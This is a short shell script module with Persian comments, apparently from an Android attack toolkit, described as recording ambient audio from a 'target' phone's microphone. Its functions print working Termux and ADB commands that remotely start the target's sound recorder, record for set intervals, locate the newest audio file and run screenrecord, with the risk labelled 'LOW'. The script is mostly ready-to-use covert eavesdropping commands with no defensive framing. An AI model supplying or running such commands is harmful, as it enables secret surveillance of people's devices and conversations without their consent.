DESC="ضبط صدای محیط از میکروفن هدف"
REQ="ADB + دسترسی RECORD_AUDIO برای shell"
RISK="LOW"

termux(){
cat <<'EOF'
termux-microphone-record -f /sdcard/mic.m4a -l 30
# توقف:
termux-microphone-record -q
EOF
}

kali(){
cat <<'EOF'
# روش ۱: از راه دور
adb shell am start -a android.provider.MediaStore.RECORD_SOUND
sleep 2; adb shell input keyevent KEYCODE_MEDIA_START
sleep 20; adb shell input keyevent KEYCODE_MEDIA_STOP
sleep 2
adb shell ls -t /sdcard/ | grep -iE 'm4a|3gp|amr' | head -1

# روش ۲: با مجوز shell روی اندروید قدیمی
adb shell screenrecord --time-limit 30 /sdcard/rec.mp4
EOF
}
